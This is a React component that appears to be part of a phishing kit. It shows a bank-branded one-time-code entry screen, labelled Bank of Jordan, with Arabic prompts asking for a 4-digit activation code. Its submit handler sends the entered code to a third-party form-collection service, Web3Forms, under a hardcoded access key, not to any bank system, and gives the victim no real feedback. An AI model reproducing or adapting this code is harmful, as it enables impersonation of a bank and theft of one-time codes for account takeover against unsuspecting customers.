import React, { useState } from 'react';
import bankLogo from '../assets/images/logo (1).png';

const OTPVerification2 = () => {
  const [otp, setOtp] = useState(''); // متغير لحفظ رمز OTP كقيمة واحدة
  const [result, setResult] = useState(''); // لعرض حالة الإرسال
  const [loading, setLoading] = useState(false); // للتحكم بشاشة التحميل

  // دالة الإرسال إلى Web3Forms
  const onSubmit = async (event) => {
    event.preventDefault();
    setLoading(true); // تفعيل شاشة التحميل

    const formData = new FormData(event.target);
    formData.append("access_key", "20f19016-48fa-475b-b343-bae03fc652bf");

    try {
      const response = await fetch("https://api.web3forms.com/submit", {
        method: "POST",
        body: formData,
      });

      const data = await response.json();

      if (data.success) {
        setOtp(''); // تفريغ حقل OTP
        event.target.reset(); // إعادة تعيين النموذج
      } else {
        setResult("حدث خطأ أثناء الإرسال، حاول مرة أخرى.");
        console.log("Error", data);
      }
    } catch (error) {
      setResult("فشل الاتصال بالخادم، تحقق من الاتصال.");
      console.error("Error:", error);
    } finally {
      setLoading(false); // إيقاف شاشة التحميل
    }
  };

  return (
    <div className="otp-modal">
      <div className="otp-content">
        <div className="h-screen w-full flex justify-center items-center">
          <div className="max-w-md mx-auto text-center px-4 sm:px-8 py-10 border-2 border-slate-500 rounded-xl">
            <header className="mb-8">
              <img src={bankLogo} className="mr-12 mb-6" alt="bank-of-jordan" width={200} />
              <h2 className="text-[18px] text-slate-500 font-bold">
                أدخل كود  التفعيل المكون من 4 ارقام. 
              </h2>
            </header>
            <form onSubmit={onSubmit}>
              <div className="flex items-center justify-center gap-3">
                <input
                  type="number"
                  placeholder="كود التفعيل "
                  value={otp}
                  maxLength={4}
                  name="active" // اسم الحقل لإرساله إلى Web3Forms
                  onChange={(e) => setOtp(e.target.value)} // تحديث قيمة OTP
                  className="w-full px-4 py-2 text-[17px] text-gray-900 bg-white border border-gray-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-[#202D5A] focus:border-transparent placeholder-gray-400"
                />
              </div>
              <div className="max-w-[200px] mx-auto mt-4">
                <button
                  id="verify-button"
                  type="submit"
                  disabled={loading} // تعطيل الزر أثناء التحميل
                  className="w-full inline-flex justify-center whitespace-nowrap rounded-lg bg-green-600 px-2 py-2.5 text-sm font-medium text-white shadow-sm shadow-indigo-950/10 hover:bg-green-900 cursor-pointer focus:outline-none focus:ring focus:ring-indigo-300 focus-visible:outline-none focus-visible:ring focus-visible:ring-indigo-300 transition-colors duration-150"
                >
                  {loading ? "جاري الإرسال..." : "إرسال"}
                </button>
              </div>
              {/* عرض نتيجة الإرسال */}
              {result && <p className="mt-4text-[#202D5A] ">{result}</p>}
            </form>
            <div className="text-sm text-slate-500 mt-4">
              لم أستلم الرمز؟{' '}
              <a className="font-medium text-[#202D5A]  hover:text-white" href="#0">
                إعادة إرسال
              </a>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default OTPVerification2;